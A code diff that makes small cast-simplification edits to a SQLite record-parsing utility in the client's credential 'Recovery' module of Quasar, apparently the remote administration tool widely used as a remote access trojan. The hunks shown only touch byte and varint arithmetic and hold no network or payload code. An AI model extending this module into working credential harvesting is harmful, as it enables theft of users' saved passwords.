@@ -91,14 +91,14 @@ namespace Quasar.Client.Recovery.Utilities
             {
                 if ((i - 1) >= startIndex)
                 {
-                    buffer[index] = (byte)((((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2)) | ((byte)(this.db_bytes[i - 1] << (num3 & 7))));
+                    buffer[index] = (byte)((((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (0xff >> num2)) | ((byte)(this.db_bytes[i - 1] << (num3 & 7))));
                     num2++;
                     index++;
                     num3--;
                 }
                 else if (!flag)
                 {
-                    buffer[index] = (byte)(((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2));
+                    buffer[index] = (byte)(((byte)(this.db_bytes[i] >> ((num2 - 1) & 7))) & (0xff >> num2));
                 }
             }
             return BitConverter.ToInt64(buffer, 0);
@@ -223,11 +223,11 @@ namespace Quasar.Client.Recovery.Utilities
                         {
                             if (this.IsOdd(numArray[index]))
                             {
-                                numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 13L)) / 2.0));
+                                numArray[index] = (long)Math.Round((double)((numArray[index] - 13L) / 2.0));
                             }
                             else
                             {
-                                numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 12L)) / 2.0));
+                                numArray[index] = (long)Math.Round((double)((numArray[index] - 12L) / 2.0));
                             }
                         }
                         else
@@ -376,11 +376,11 @@ namespace Quasar.Client.Recovery.Utilities
                         {
                             if (this.IsOdd(_fieldArray[j].type))
                             {
-                                _fieldArray[j].size = (long)Math.Round((double)(((double)(_fieldArray[j].type - 13L)) / 2.0));
+                                _fieldArray[j].size = (long)Math.Round((double)((_fieldArray[j].type - 13L) / 2.0));
                             }
                             else
                             {
-                                _fieldArray[j].size = (long)Math.Round((double)(((double)(_fieldArray[j].type - 12L)) / 2.0));
+                                _fieldArray[j].size = (long)Math.Round((double)((_fieldArray[j].type - 12L) / 2.0));
                             }
                         }
                         else
